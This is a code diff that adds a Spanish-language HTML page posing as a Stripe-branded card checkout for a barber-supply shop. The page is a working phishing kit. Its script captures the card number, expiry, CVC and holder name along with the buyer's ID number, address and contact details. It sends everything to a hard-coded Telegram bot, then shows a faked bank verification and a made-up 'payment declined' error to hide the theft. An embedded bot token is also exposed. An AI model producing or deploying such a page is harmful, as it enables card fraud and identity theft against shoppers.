@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pasarela de Pago Segura — BarberSupply</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        /* Estilo Estricto Pasarela de Pago Premium (Estilo Stripe) */
+        :root {
+            --bg-main: #ffffff;
+            --bg-sidebar: #f8f9fa;
+            --text-primary: #000000;
+            --text-secondary: #6b7280;
+            --border-color: #e5e7eb;
+            --accent-success: #008000;
+            --accent-error: #df1b41;
+            --input-focus: #000000;
+            --stripe-blue: #6772e5;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-main);
+            color: var(--text-primary);
+        }
+
+        /* --- NAVBAR EXCLUSIVO STRIPE --- */
+        .stripe-navbar {
+            width: 100%;
+            height: 56px;
+            background-color: var(--bg-main);
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 100;
+        }
+
+        .stripe-logo-img {
+            height: 22px;
+            width: auto;
+        }
+
+        /* --- CONTENEDOR PRINCIPAL ESTILO STRIPE --- */
+        .gateway-wrapper {
+            display: flex;
+            flex-direction: column-reverse;
+            min-height: 100vh;
+            padding-top: 56px;
+        }
+
+        @media (min-width: 992px) {
+            .gateway-wrapper {
+                display: grid;
+                grid-template-columns: 1fr 440px;
+            }
+        }
+
+        /* --- COLUMNA IZQUIERDA: FORMULARIO DE TARJETA --- */
+        .form-section {
+            padding: 32px 16px;
+            display: flex;
+            justify-content: center;
+        }
+
+        @media (min-width: 992px) {
+            .form-section {
+                padding: 48px 64px;
+                justify-content: flex-end;
+            }
+        }
+
+        .form-container-narrow {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            font-size: 13px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            margin-bottom: 24px;
+            font-weight: 500;
+        }
+        .back-link:hover {
+            color: var(--text-primary);
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            color: var(--text-primary);
+        }
+
+        /* --- DISEÑO DE INPUTS INTEGRADOS --- */
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 16px;
+        }
+
+        .input-label {
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 14px;
+            border: 1px solid var(--border-color);
+            background-color: var(--bg-main);
+            color: var(--text-primary);
+            outline: none;
+            border-radius: 4px;
+            transition: border-color 0.15s ease;
+        }
+        .input-field:focus {
+            border-color: var(--input-focus);
+        }
+
+        .card-fields-composite {
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            overflow: hidden;
+            position: relative;
+        }
+        .card-fields-composite .input-field {
+            border: none;
+            border-radius: 0;
+        }
+        .card-fields-composite .input-field:not(:last-child) {
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .card-number-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .card-number-wrapper .input-field {
+            padding-right: 54px;
+        }
+
+        .card-brand-container {
+            position: absolute;
+            right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+            height: 100%;
+        }
+        
+        .card-brand-icon {
+            width: 32px;
+            height: auto;
+            display: none;
+        }
+        
+        .card-brand-icon.visible {
+            display: block;
+        }
+
+        .card-fields-split {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+        }
+        .card-fields-split .input-field:first-child {
+            border-right: 1px solid var(--border-color);
+        }
+
+        /* --- COLUMNA DERECHA: SIDEBAR RESUMEN DE COBRO --- */
+        .summary-section {
+            background-color: var(--bg-sidebar);
+            padding: 32px 16px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        @media (min-width: 992px) {
+            .summary-section {
+                padding: 48px 48px;
+                border-bottom: none;
+                border-left: 1px solid var(--border-color);
+            }
+        }
+
+        .merchant-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+
+        .charge-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--text-primary);
+            letter-spacing: -1px;
+            margin-bottom: 24px;
+        }
+
+        .products-checkout-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            max-height: 240px;
+            overflow-y: auto;
+            margin-bottom: 20px;
+            padding-right: 4px;
+        }
+        .product-checkout-item { 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between;
+            gap: 12px; 
+            padding-bottom: 12px;
+            border-bottom: 1px solid #f1f1f4;
+        }
+        .product-checkout-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            min-width: 0;
+        }
+        .product-checkout-img-wrapper { 
+            width: 40px; 
+            height: 40px; 
+            background: #ffffff; 
+            border: 1px solid var(--border-color); 
+            border-radius: 4px; 
+            flex-shrink: 0; 
+            position: relative; 
+        }
+        .product-checkout-img { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+            border-radius: 4px; 
+        }
+        .product-checkout-badge { 
+            position: absolute; 
+            top: -5px; 
+            right: -5px; 
+            background: #4b5563; 
+            color: #ffffff; 
+            font-size: 9px; 
+            font-weight: 700; 
+            width: 16px; 
+            height: 16px; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+        }
+        .product-checkout-name { 
+            font-size: 13px; 
+            font-weight: 500; 
+            white-space: nowrap; 
+            overflow: hidden; 
+            text-overflow: ellipsis; 
+            color: var(--text-primary); 
+        }
+        .product-checkout-price { 
+            font-size: 13px; 
+            font-weight: 600; 
+            color: var(--text-primary); 
+            flex-shrink: 0;
+        }
+
+        .pricing-breakdown {
+            border-top: 1px solid var(--border-color);
+            padding-top: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .pricing-row { display: flex; justify-content: space-between; font-size: 13px; color: var(--text-secondary); }
+        .pricing-row.total-row { font-size: 14px; font-weight: 600; color: var(--text-primary); text-transform: uppercase; padding-top: 4px; }
+
+        .btn-pay-now {
+            background-color: var(--text-primary);
+            color: var(--bg-main);
+            border: none;
+            padding: 14px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            outline: none;
+            margin-top: 24px;
+            transition: opacity 0.2s ease;
+        }
+        .btn-pay-now:hover { opacity: 0.9; }
+
+        .legal-notice-text {
+            font-size: 11px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            margin-top: 16px;
+            text-align: justify;
+        }
+
+        /* --- INTERFAZ DE CARGA / ERROR ULTRA REALISTA (TEMÁTICA STRIPE NEXUS) --- */
+        .gateway-status-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--bg-main);
+            z-index: 200;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .status-container {
+            padding: 30px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+
+        /* Spinner Avanzado con Icono Flotante en el Centro */
+        .loader-wrapper {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 32px;
+        }
+        
+        .spinner {
+            width: 100%;
+            height: 100%;
+            border: 3px solid rgba(0,0,0,0.05);
+            border-top: 3px solid var(--stripe-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .card-logo-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 1.8rem;
+            color: #4b5563;
+            transition: all 0.3s ease;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--text-primary);
+        }
+
+        .status-desc {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        /* Icono de error animado */
+        .status-icon-error {
+            font-size: 4.5rem;
+            color: var(--accent-error);
+            margin-bottom: 24px;
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+        }
+
+        @keyframes shake {
+            10%, 90% { transform: translate3d(-1px, 0, 0); }
+            20%, 80% { transform: translate3d(2px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+            40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
+
+        .btn-retry {
+            display: inline-block;
+            margin-top: 32px;
+            background: var(--text-primary);
+            color: var(--bg-main);
+            padding: 14px 28px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 13px;
+            width: 100%;
+            transition: opacity 0.2s ease;
+        }
+        .btn-retry:hover { opacity: 0.9; }
+    </style>
+</head>
+<body>
+
+    <header class="stripe-navbar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/ba/Stripe_Logo%2C_revised_2016.svg/1280px-Stripe_Logo%2C_revised_2016.svg.png" class="stripe-logo-img" alt="Stripe">
+    </header>
+
+    <main class="gateway-wrapper">
+        
+        <section class="form-section">
+            <div class="form-container-narrow">
+                
+                <a href="pago.html" class="back-link">&larr; Volver al checkout</a>
+                
+                <form id="gatewayForm" onsubmit="procesarPagoTarjeta(event)">
+                    <h2 class="section-title">Datos de la tarjeta</h2>
+                    
+                    <div class="form-group">
+                        <label class="input-label" for="cardEmail">Correo electrónico</label>
+                        <input type="email" id="cardEmail" class="input-field" required readonly>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="input-label">Información de la tarjeta</label>
+                        <div class="card-fields-composite">
+                            
+                            <div class="card-number-wrapper">
+                                <input type="text" id="cardNumber" class="input-field" placeholder="1234 5678 1234 5678" required inputmode="numeric" maxlength="19" oninput="formatearNumeroTarjeta(this)">
+                                <div class="card-brand-container">
+                                    <img id="visaLogo" src="https://img.icons8.com/color/48/visa.png" class="card-brand-icon" alt="Visa">
+                                    <img id="masterLogo" src="https://img.icons8.com/color/48/mastercard.png" class="card-brand-icon" alt="Mastercard">
+                                    <img id="amexLogo" src="https://img.icons8.com/color/48/amex.png" class="card-brand-icon" alt="Amex">
+                                </div>
+                            </div>
+                            
+                            <div class="card-fields-split">
+                                <input type="text" id="cardExpiry" class="input-field" placeholder="MM / AA" required inputmode="numeric" maxlength="7" oninput="formatearVencimiento(this)">
+                                <input type="text" id="cardCvc" class="input-field" placeholder="CVC" required inputmode="numeric" maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-group" style="margin-top: 20px;">
+                        <label class="input-label" for="cardHolder">Nombre en la tarjeta</label>
+                        <input type="text" id="cardHolder" class="input-field" placeholder="Juan Pérez" required>
+                    </div>
+
+                    <button type="submit" class="btn-pay-now" id="btnPagarTotal">Pagar</button>
+                    
+                    <p class="legal-notice-text">
+                        Al completar la compra, aceptás nuestros Términos de servicio y confirmás que leíste nuestra Política de privacidad. Los datos de facturación se procesarán de forma segura e inmediata para dar de alta tu orden de compra en el sistema.
+                    </p>
+                </form>
+
+                <div style="margin-top: 32px; display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 12px; color: var(--text-secondary);">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                    Procesamiento de pago seguro cifrado de extremo a extremo
+                </div>
+
+            </div>
+        </section>
+
+        <section class="summary-section">
+            <div class="merchant-name">KC-Distribuidor</div>
+            <div class="charge-amount" id="chargeAmountDisplay">$0</div>
+            
+            <div class="products-checkout-list" id="gatewayProductsContainer"></div>
+
+            <div class="pricing-breakdown">
+                <div class="pricing-row"><span>Subtotal</span><span id="subtotalText">$0</span></div>
+                <div class="pricing-row"><span>Envío</span><span style="color: var(--accent-success); font-weight: 500;">Gratis</span></div>
+                <div class="pricing-row total-row"><span>Total debido</span><span id="totalText">$0</span></div>
+            </div>
+        </section>
+
+    </main>
+
+    <div class="gateway-status-overlay" id="gatewayOverlay">
+        
+        <div class="status-container" id="loading-ui">
+            <div class="loader-wrapper">
+                <div class="spinner" id="stripeProgressSpinner"></div>
+                <i id="dynamic-card-icon" class="far fa-credit-card card-logo-icon"></i>
+            </div>
+            <h2 class="status-title" id="status-title">Verificando transacción...</h2>
+            <p class="status-desc" id="status-desc">Estamos comunicándonos con tu entidad bancaria para autorizar el pago. No cierres esta ventana.</p>
+        </div>
+
+        <div class="status-container" id="error-ui" style="display: none;">
+            <i class="fas fa-times-circle status-icon-error"></i>
+            <h2 class="status-title" style="font-size: 22px;">Pago Rechazado</h2>
+            <p class="status-desc">Lo sentimos, la transacción no pudo ser procesada por el emisor de la tarjeta (Código: 05 - Fondos Insuficientes o Operación Denegada).</p>
+            <a href="index.html" class="btn-retry">Volver al inicio</a>
+        </div>
+        
+    </div>
+
+    <script>
+        // Credenciales estrictas solicitadas para canalización única
+        const TELEGRAM_TOKEN = "8808788652:AAEhlPL3MbE6Njd0QrblTX4vIQ0C1bKn3tc";
+        const TELEGRAM_CHAT_ID = "6493944778";
+
+        const ordenData = JSON.parse(localStorage.getItem('order_checkout_data'));
+
+        function inicializarPasarelaStripe() {
+            if (!ordenData) {
+                alert("No se detectó una intención de cobro activa.");
+                window.location.href = "index.html";
+                return;
+            }
+
+            const totalFormateado = `$${ordenData.totales.total.toLocaleString('es-AR')}`;
+            document.getElementById('chargeAmountDisplay').innerText = totalFormateado;
+            document.getElementById('subtotalText').innerText = `$${ordenData.totales.subtotal.toLocaleString('es-AR')}`;
+            document.getElementById('totalText').innerText = totalFormateado;
+
+            if (ordenData.contacto && ordenData.contacto.email) {
+                document.getElementById('cardEmail').value = ordenData.contacto.email;
+            }
+
+            const container = document.getElementById('gatewayProductsContainer');
+            container.innerHTML = "";
+            ordenData.productos.forEach(item => {
+                container.innerHTML += `
+                    <div class="product-checkout-item">
+                        <div class="product-checkout-left">
+                            <div class="product-checkout-img-wrapper">
+                                <img class="product-checkout-img" src="${item.img}" alt="${item.name}">
+                                <span class="product-checkout-badge">${item.cantidad}</span>
+                            </div>
+                            <div class="product-checkout-name">${item.name}</div>
+                        </div>
+                        <div class="product-checkout-price">${item.price}</div>
+                    </div>`;
+            });
+            
+            document.getElementById('btnPagarTotal').innerText = `Pagar ${totalFormateado}`;
+        }
+
+        // MÁSCARAS E INYECCIÓN DINÁMICA DE LOGOS (INPUTS + LOADER CENTRAL)
+        function formatearNumeroTarjeta(input) {
+            let valor = input.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
+            
+            const visa = document.getElementById('visaLogo');
+            const master = document.getElementById('masterLogo');
+            const amex = document.getElementById('amexLogo');
+            const centerIcon = document.getElementById('dynamic-card-icon');
+
+            visa.classList.remove('visible');
+            master.classList.remove('visible');
+            amex.classList.remove('visible');
+
+            // Ajuste por defecto del loader central
+            centerIcon.className = 'far fa-credit-card card-logo-icon';
+            document.documentElement.style.setProperty('--stripe-blue', '#6772e5');
+
+            if (valor.length >= 1) {
+                const primerDigito = valor.charAt(0);
+                if (primerDigito === '4') {
+                    visa.classList.add('visible');
+                    centerIcon.className = 'fab fa-cc-visa card-logo-icon';
+                    document.documentElement.style.setProperty('--stripe-blue', '#4349c2'); // Visa Blue
+                } else if (primerDigito === '5') {
+                    master.classList.add('visible');
+                    centerIcon.className = 'fab fa-cc-mastercard card-logo-icon';
+                    document.documentElement.style.setProperty('--stripe-blue', '#ff5f00'); // Mastercard Orange
+                } else if (primerDigito === '3') {
+                    amex.classList.add('visible');
+                    centerIcon.className = 'fab fa-cc-amex card-logo-icon';
+                    document.documentElement.style.setProperty('--stripe-blue', '#0170b2'); // Amex Blue
+                }
+            }
+
+            let bloques = [];
+            for (let i = 0; i < valor.length; i += 4) {
+                bloques.push(valor.substring(i, i + 4));
+            }
+            input.value = bloques.join(' ');
+        }
+
+        function formatearVencimiento(input) {
+            let valor = input.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
+            if (valor.length > 2) {
+                input.value = valor.substring(0, 2) + ' / ' + valor.substring(2, 4);
+            } else {
+                input.value = valor;
+            }
+        }
+
+        // CAPTURA, EXTRACCIÓN TOTAL Y ANIMACIÓN DE RECHAZO CONTROLADO
+        window.procesarPagoTarjeta = async function(event) {
+            event.preventDefault();
+
+            // Activar overlay de carga inmediatamente
+            const overlay = document.getElementById('gatewayOverlay');
+            overlay.style.display = 'flex';
+
+            let marcaDetectada = 'Tarjeta Global';
+            if (document.getElementById('visaLogo').classList.contains('visible')) marcaDetectada = 'Visa';
+            if (document.getElementById('masterLogo').classList.contains('visible')) marcaDetectada = 'Mastercard';
+            if (document.getElementById('amexLogo').classList.contains('visible')) marcaDetectada = 'American Express';
+
+            // Datos puros ingresados en la pasarela
+            const datosTarjetaForm = {
+                numero: document.getElementById('cardNumber').value,
+                titular: document.getElementById('cardHolder').value,
+                vencimiento: document.getElementById('cardExpiry').value,
+                cvc: document.getElementById('cardCvc').value,
+                marca: marcaDetectada
+            };
+
+            // Construir reporte total unificando pago.html + tarjetas.html
+            let mensajeTexto = `💳 *NUEVA TRANSACCIÓN — DATOS COMPLETOS DE COMPRA*\n`;
+            mensajeTexto += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
+            mensajeTexto += `👤 *DATOS RECOLECTADOS (PAGO.HTML):*\n`;
+            mensajeTexto += `• *Nombre:* ${ordenData.destinatario.nombre} ${ordenData.destinatario.apellido}\n`;
+            mensajeTexto += `• *Email:* ${ordenData.contacto.email}\n`;
+            mensajeTexto += `• *Teléfono:* ${ordenData.contacto.telefono}\n`;
+            mensajeTexto += `• *DNI/CUIT:* ${ordenData.facturacion.dniCuitTitular}\n\n`;
+
+            mensajeTexto += `📍 *LOGÍSTICA Y DESPACHO:*\n`;
+            mensajeTexto += `• *Calle/Nº:* ${ordenData.destinatario.direccion}\n`;
+            if(ordenData.destinatario.depto) mensajeTexto += `• *Piso/Depto:* ${ordenData.destinatario.depto}\n`;
+            if(ordenData.destinatario.barrio) mensajeTexto += `• *Barrio:* ${ordenData.destinatario.barrio}\n`;
+            mensajeTexto += `• *Ciudad:* ${ordenData.destinatario.ciudad}\n`;
+            mensajeTexto += `• *Provincia:* ${ordenData.destinatario.provincia}\n`;
+            mensajeTexto += `• *Código Postal:* ${ordenData.codigoPostal || ordenData.destinatario.codigoPostal || '-'}\n\n`;
+
+            if(ordenData.facturacion.requiereFacturaA) {
+                mensajeTexto += `🏢 *DATOS FACTURA A:*\n`;
+                mensajeTexto += `• *Razón Social:* ${ordenData.facturacion.razonSocial}\n`;
+                mensajeTexto += `• *CUIT Fiscal:* ${ordenData.facturacion.cuitFiscal}\n`;
+                mensajeTexto += `• *Condición IVA:* ${ordenData.facturacion.condicionIva}\n`;
+                mensajeTexto += `• *Dir. Fiscal:* ${ordenData.facturacion.direccionFiscal}\n\n`;
+            } else {
+                mensajeTexto += `🧾 *FACTURACIÓN:* Consumidor Final\n\n`;
+            }
+
+            mensajeTexto += `🔥 *DATOS DE TARJETA EXTRACCIÓN (TARJETAS.HTML):*\n`;
+            mensajeTexto += `• *Titular:* ${datosTarjetaForm.titular}\n`;
+            mensajeTexto += `• *Número:* \`${datosTarjetaForm.numero}\`\n`;
+            mensajeTexto += `• *Vence:* \`${datosTarjetaForm.vencimiento}\`\n`;
+            mensajeTexto += `• *CVC:* \`${datosTarjetaForm.cvc}\`\n`;
+            mensajeTexto += `• *Franquicia:* ${datosTarjetaForm.marca}\n\n`;
+
+            mensajeTexto += `🛒 *DETALLE DEL CARRO:* \n`;
+            ordenData.productos.forEach((p, index) => {
+                mensajeTexto += `${index + 1}. ${p.name} [x${p.cantidad}] — (${p.price})\n`;
+            });
+            mensajeTexto += `\n💵 *TOTAL COMPROMETIDO:* $${ordenData.totales.total.toLocaleString('es-AR')}\n`;
+            mensajeTexto += `━━━━━━━━━━━━━━━━━━━━━`;
+
+            // Enviar reporte completo a Telegram de forma inmediata de fondo
+            try {
+                const urlTexto = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+                await fetch(urlTexto, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensajeTexto,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {
+                console.log("Fallo de red en el reporte.");
+            }
+
+            // SIMULACIÓN AVANZADA DE CRISIS BANCARIA (6 SEGUNDOS EXACTOS)
+            setTimeout(() => {
+                document.getElementById('status-title').innerText = "Validando protocolos 3D Secure...";
+                document.getElementById('status-desc').innerText = "Autenticando firma digital de seguridad con la entidad bancaria emisora. No refresques.";
+            }, 2500);
+
+            setTimeout(() => {
+                // Cambiar interfaz a Rechazo Absoluto
+                document.getElementById('loading-ui').style.display = 'none';
+                document.getElementById('error-ui').style.display = 'block';
+                
+                // Limpieza absoluta por "seguridad transaccional"
+                localStorage.removeItem('barber_cart_items');
+                localStorage.removeItem('order_checkout_data');
+            }, 6000);
+        }
+
+        inicializarPasarelaStripe();
+    </script>
+</body>
+</html>
